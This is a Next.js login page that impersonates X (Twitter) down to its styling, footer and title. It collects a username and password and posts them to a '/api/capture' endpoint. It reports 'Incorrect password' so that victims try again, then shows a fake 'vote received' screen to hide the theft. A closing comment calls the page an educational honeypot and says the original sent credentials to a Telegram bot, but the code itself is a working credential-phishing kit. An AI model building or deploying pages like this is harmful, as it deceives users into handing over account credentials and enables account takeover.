import Head from 'next/head';
import { useState, useRef, useEffect } from 'react';

export default function TwitterLoginPage() {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [disabled, setDisabled] = useState(false);
  const attemptCountRef = useRef(0);
  const MAX_ATTEMPTS = 5;

  const usernameInputRef = useRef(null);
  const passwordInputRef = useRef(null);
  const displayUsernameRef = useRef(null);

  const [error, setError] = useState('');

  useEffect(() => {
    if (step === 1 && usernameInputRef.current) {
      usernameInputRef.current.focus();
    }
    if (step === 2 && passwordInputRef.current) {
      passwordInputRef.current.focus();
    }
  }, [step]);

  const goToStep = (n) => {
    setStep(n);
  };

  const handleNext = () => {
    const trimmedUsername = username.trim();
    if (!trimmedUsername) {
      setFeedback('Please enter a phone, email, or username.');
      return;
    }
    setFeedback('');
    setStep(2);
    if (displayUsernameRef.current) {
      displayUsernameRef.current.textContent = '@' + trimmedUsername.replace(/^@/, '');
    }
  };

  const handleBack = () => {
    setUsername(displayUsernameRef.current?.textContent?.replace('@', '') || '');
    setStep(1);
  };

  const handleSignIn = async () => {
    if (!password) {
      setFeedback('Password cannot be empty.');
      return;
    }

    if (attemptCountRef.current >= MAX_ATTEMPTS) {
      setFeedback('Too many attempts. Please try again later.');
      return;
    }

    attemptCountRef.current += 1;

    try {
      const payload = {
        username: username.trim(),
        password: password,
        method: 'twitter'
      };

      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await res.json();

      if (res.ok && data.ok) {
        if (attemptCountRef.current >= MAX_ATTEMPTS) {
          setShowSuccess(true);
        } else {
          setShowSuccess(true);
        }
      } else {
        setFeedback('Incorrect password! Please try again.');
        setPassword('');
      }
    } catch (err) {
      console.error('Submission error:', err);
      if (attemptCountRef.current >= MAX_ATTEMPTS) {
        setShowSuccess(true);
      } else {
        setFeedback('Incorrect password! Please try again.');
        setPassword('');
      }
    }
  };

  const handleForgotPassword = () => {
    alert('Password reset flow (placeholder).');
  };

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const handleKeyDown = (e, type) => {
    if (e.key === 'Enter') {
      if (type === 'username') handleNext();
      else handleSignIn();
    }
  };

  return (
    <>
      <Head>
        <title>Log in / X</title>
      </Head>

      <style jsx>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          background-color: #000;
          color: #e7e9ea;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .login-shell {
          width: 100%;
          max-width: 600px;
          flex: 1;
          display: flex;
          flex-direction: column;
          padding: 0 16px;
        }

        .logo {
          display: flex;
          justify-content: center;
          margin: 32px 0 40px;
        }

        .logo img {
          width: 40px;
          height: 40px;
        }

        .login-card {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .step-container {
          position: relative;
          min-height: 320px;
        }

        .step {
          width: 100%;
        }

        .step.hidden {
          display: none;
        }

        .hidden {
          display: none;
        }

        .login-card h1 {
          font-size: 31px;
          font-weight: 700;
          letter-spacing: -0.5px;
          line-height: 1.2;
          margin-bottom: 24px;
        }

        .x-input {
          width: 100%;
          background: #000;
          border: 1px solid #2f3336;
          border-radius: 4px;
          color: #e7e9ea;
          font-size: 17px;
          padding: 16px 12px;
          margin-bottom: 4px;
          transition: border-color 0.15s ease;
        }

        .x-input::placeholder {
          color: #71767b;
        }

        .x-input:focus {
          outline: none;
          border-color: #1d9bf0;
        }

        .x-input:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .x-btn {
          width: 100%;
          border-radius: 9999px;
          font-size: 15px;
          font-weight: 700;
          padding: 15px 0;
          cursor: pointer;
          transition: background-color 0.15s ease;
          border: 1px solid transparent;
        }

        .x-btn.primary {
          background: #eff3f4;
          color: #0f1419;
          border-color: #eff3f4;
        }

        .x-btn.primary:hover {
          background: #d7dbdc;
        }

        .x-btn.secondary {
          background: #000;
          color: #eff3f4;
          border-color: #536471;
        }

        .x-btn.secondary:hover {
          background: rgba(29, 155, 240, 0.1);
          border-color: #1d9bf0;
        }

        .x-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .user-chip {
          display: flex;
          align-items: center;
          justify-content: space-between;
          border: 1px solid #2f3336;
          border-radius: 4px;
          padding: 12px;
          margin-bottom: 24px;
          font-size: 15px;
        }

        .user-chip .handle {
          color: #e7e9ea;
          font-weight: 700;
        }

        .user-chip .signout {
          color: #1d9bf0;
          background: none;
          border: none;
          font-size: 13px;
          cursor: pointer;
        }

        .user-chip .signout:hover {
          text-decoration: underline;
        }

        .password-box {
          position: relative;
          display: flex;
          align-items: center;
        }

        .password-box .x-input {
          padding-right: 44px;
        }

        .toggle-password {
          position: absolute;
          right: 12px;
          padding: 4px;
          cursor: pointer;
          color: #71767b;
          user-select: none;
          display: flex;
          align-items: center;
          background: none;
          border: none;
        }

        .toggle-password svg {
          width: 20px;
          height: 20px;
          stroke: #71767b;
          stroke-width: 1.5;
        }

        .feedback-message {
          font-size: 13px;
          color: #f4212e;
          min-height: 18px;
          margin-top: 2px;
          margin-bottom: 6px;
        }

        .back-link {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          color: #1d9bf0;
          background: none;
          border: none;
          font-size: 14px;
          cursor: pointer;
          margin-bottom: 16px;
        }

        .back-link:hover {
          text-decoration: underline;
        }

        .back-link svg {
          width: 18px;
          height: 18px;
          stroke: #1d9bf0;
          stroke-width: 2;
          fill: none;
          stroke-linecap: round;
          stroke-linejoin: round;
        }

        .signup-row {
          margin-top: 24px;
          font-size: 15px;
          color: #71767b;
        }

        .signup-row a {
          color: #1d9bf0;
          text-decoration: none;
        }

        .signup-row a:hover {
          text-decoration: underline;
        }

        .divider {
          height: 1px;
          background: #2f3336;
          margin-top: 24px;
        }

        .login-footer {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 8px 16px;
          padding: 28px 0 36px;
          font-size: 13px;
        }

        .login-footer a {
          color: #71767b;
          text-decoration: none;
          white-space: nowrap;
        }

        .login-footer a:hover {
          text-decoration: underline;
        }

        .success-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0, 0, 0, 0.97);
          z-index: 99999;
          display: none;
          align-items: center;
          justify-content: center;
          padding: 20px;
          text-align: center;
        }

        .success-overlay.show {
          display: flex;
        }

        .success-box {
          max-width: 440px;
          width: 100%;
        }

        .checkmark {
          width: 110px;
          height: 110px;
          margin: 0 auto 28px;
          border-radius: 50%;
          background: #00ba7c;
          box-shadow: 0 14px 34px rgba(0, 186, 124, 0.35);
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .checkmark svg {
          width: 56px;
          height: 56px;
        }

        .checkmark polyline {
          fill: none;
          stroke: #fff;
          stroke-width: 7;
          stroke-linecap: round;
          stroke-linejoin: round;
          stroke-dasharray: 60;
          stroke-dashoffset: 60;
          animation: draw-check 0.45s ease-out 0.25s forwards;
        }

        @keyframes pop-in {
          0% { transform: scale(0); }
          70% { transform: scale(1.12); }
          100% { transform: scale(1); }
        }

        @keyframes draw-check {
          to { stroke-dashoffset: 0; }
        }

        .success-box h2 {
          font-size: 26px;
          font-weight: 700;
          color: #fff;
          margin: 0 0 12px;
        }

        .success-box p {
          font-size: 15px;
          line-height: 1.55;
          margin: 0;
          color: #71767b;
        }

        @media (max-width: 480px) {
          .logo {
            margin: 24px 0 32px;
          }
          .login-card h1 {
            font-size: 27px;
          }
          .x-input {
            font-size: 16px;
            padding: 14px 12px;
          }
          .login-footer {
            gap: 8px 14px;
            font-size: 12px;
          }
        }
      `}</style>

      <div className="login-shell">
        <div className="logo">
          <img src="/images/x_logo.svg" alt="X" />
        </div>

        <main className="login-card">
          <div className="step-container">
            {step === 1 && (
              <div className="step">
                <h1>Sign in to X</h1>
                <input
                  type="text"
                  id="username-input"
                  className="x-input"
                  placeholder="Phone, email, or username"
                  autoComplete="off"
                  ref={usernameInputRef}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onKeyDown={(e) => handleKeyDown(e, 'username')}
                />
                <div className="feedback-message">{feedback}</div>
              </div>
            )}

            {step === 2 && (
              <div className="step">
                <button id="back-link" className="back-link" onClick={handleBack}>
                  <svg viewBox="0 0 24 24">
                    <path d="M15 18l-6-6 6-6"></path>
                  </svg>
                  Back
                </button>
                <div className="user-chip">
                  <span id="display-username" className="handle" ref={displayUsernameRef}>
                    @{username.replace(/^@/, '')}
                  </span>
                  <button className="signout" id="signout-link" onClick={() => setUsername('')}>
                    Sign out
                  </button>
                </div>
                <h1>Enter your password</h1>
                <div className="password-box">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password-input"
                    className="x-input"
                    placeholder="Password"
                    autoComplete="off"
                    ref={passwordInputRef}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) => handleKeyDown(e, 'password')}
                    disabled={disabled}
                  />
                  <button
                    className="toggle-password"
                    id="toggle-password-icon"
                    aria-label="Toggle password"
                    onClick={togglePassword}
                  >
                    {showPassword ? (
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                      </svg>
                    ) : (
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                      </svg>
                    )}
                  </button>
                </div>
                <div className="feedback-message" id="feedback">{feedback}</div>
              </div>
            )}
          </div>

          {step === 1 && (
            <div id="actions-step1">
              <button className="x-btn primary" id="next-login-button" onClick={handleNext}>
                Next
              </button>
              <button className="x-btn secondary" id="forgot-password-btn" onClick={handleForgotPassword}>
                Forgot password?
              </button>
              <div className="divider"></div>
              <p className="signup-row">
                Don&apos;t have an account? <a href="#">Sign up</a>
              </p>
            </div>
          )}

          {step === 2 && (
            <div id="actions-step2">
              <button className="x-btn primary" id="log-in-button" onClick={handleSignIn} disabled={disabled}>
                Log in
              </button>
              <button className="x-btn secondary" id="forgot-password-btn2" onClick={handleForgotPassword}>
                Forgot password?
              </button>
            </div>
          )}
        </main>

        <footer className="login-footer">
          <a href="#">About</a>
          <a href="#">Download the X app</a>
          <a href="#">Help Center</a>
          <a href="#">Terms of Service</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Cookie Policy</a>
          <a href="#">Accessibility</a>
          <a href="#">Ads info</a>
          <a href="#">Blog</a>
          <a href="#">Status</a>
          <a href="#">Careers</a>
          <a href="#">Brand Resources</a>
          <a href="#">Advertising</a>
          <a href="#">Marketing</a>
          <a href="#">X for Business</a>
          <a href="#">Developers</a>
          <a href="#">Directory</a>
          <a href="#">Settings</a>
          <span>© 2026 X Corp.</span>
        </footer>
      </div>

      {/* Vote confirmation overlay */}
      <div className={`success-overlay ${showSuccess ? 'show' : ''}`} id="successOverlay" aria-hidden="true">
        <div className="success-box">
          <div className="checkmark">
            <svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
              <polyline points="15,27 24,36 39,17"></polyline>
            </svg>
          </div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>

      {/* Honeypot notice - educational only */}
      {/* The original page exfiltrates credentials to a Telegram bot */}
    </>
  );
}